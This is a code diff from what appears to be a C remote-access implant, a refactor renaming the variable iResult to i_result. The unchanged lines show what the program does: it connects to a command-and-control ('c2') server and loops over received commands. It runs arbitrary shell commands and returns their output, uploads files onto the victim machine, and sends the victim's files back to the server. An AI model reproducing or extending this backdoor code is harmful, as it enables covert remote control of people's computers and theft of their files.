@@ -59,18 +59,18 @@ int recv_file(char* const buf, const char* filename, const SOCKET connect_socket
 	uint32_t f_size = ntohl_conv(&*(buf));
 
 	// Receive all file bytes/chunks and write to parsed filename.
-	int iResult = 1;
+	int i_result = 1;
 	long int total = 0;
 
-	while (total != f_size && iResult > 0) {
-		iResult = recv(connect_socket, buf, BUFLEN, 0);
-		fwrite(buf, 1, iResult, fd);
-		total += iResult;
+	while (total != f_size && i_result > 0) {
+		i_result = recv(connect_socket, buf, BUFLEN, 0);
+		fwrite(buf, 1, i_result, fd);
+		total += i_result;
 	}
 
 	fclose(fd);
 
-	return iResult;
+	return i_result;
 }
 
 // Function for sending file to client (TCP file transfer).
@@ -94,16 +94,16 @@ int send_file(const char* filename, const SOCKET connect_socket, char* const buf
 	if (send(connect_socket, (char*)&bytes, sizeof(bytes), 0) < 1)
 		return SOCKET_ERROR;
 
-	int iResult = 1;
+	int i_result = 1;
 
 	// Recursively read file until EOF is detected and send file bytes to c2 server in BUFLEN chunks.
 	if (f_size) {
 		int bytes_read;
-		while (!feof(fd) && iResult > 0) {
+		while (!feof(fd) && i_result > 0) {
 			// Recursively read file until end of file (EOF).
 			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
 				// Send read bytes chunk to c2 server.
-				iResult = send(connect_socket, buf, bytes_read, 0);
+				i_result = send(connect_socket, buf, bytes_read, 0);
 			}
 			else {
 				break;
@@ -113,7 +113,7 @@ int send_file(const char* filename, const SOCKET connect_socket, char* const buf
 		fclose(fd);
 	}
 
-	return iResult;
+	return i_result;
 }
 
 // Function to execute command.
@@ -155,13 +155,13 @@ int exec_cmd(const SOCKET connect_socket, char* const buf) {
 	if (send(connect_socket, (char*)&bytes, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
-	int iResult = send(connect_socket, output, s_size, 0);
+	int i_result = send(connect_socket, output, s_size, 0);
 	free(output);
 
 	// Close the pipe stream.
 	_pclose(fpipe);
 
-	return iResult;
+	return i_result;
 }
 
 // Main function for connecting to c2 server & parsing c2 commands.
@@ -177,8 +177,8 @@ int main(void) {
 		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
 			  occurs (connection lost, etc) break the loop and reconnect & restart loop. */
 		if (connect_socket != INVALID_SOCKET) {
-			int iResult = c2_connect(connect_socket, host, port);
-			while (iResult > 0) {
+			int i_result = c2_connect(connect_socket, host, port);
+			while (i_result > 0) {
 				// BUFLEN + 1 + 4, for null byte and "2>&1" string concatenation
 				char buf[BUFLEN + 5] = { 0 };
 
@@ -188,7 +188,7 @@ int main(void) {
 				// buf[0] is the command code and &buf[1] is the parsed data.
 				switch (buf[0]) {
 					case '0':
-						iResult = exec_cmd(connect_socket, &buf[1]);
+						i_result = exec_cmd(connect_socket, &buf[1]);
 						break;
 					case '1':
 						// Change directory.
@@ -199,11 +199,11 @@ int main(void) {
 						return 0;
 					case '3':
 						// Upload file to client system.
-						iResult = recv_file(buf, &buf[1], connect_socket);
+						i_result = recv_file(buf, &buf[1], connect_socket);
 						break;
 					case '4':
 						// Download file from client system.
-						iResult = send_file(&buf[1], connect_socket, buf);
+						i_result = send_file(&buf[1], connect_socket, buf);
 						break;
 				}
 			}
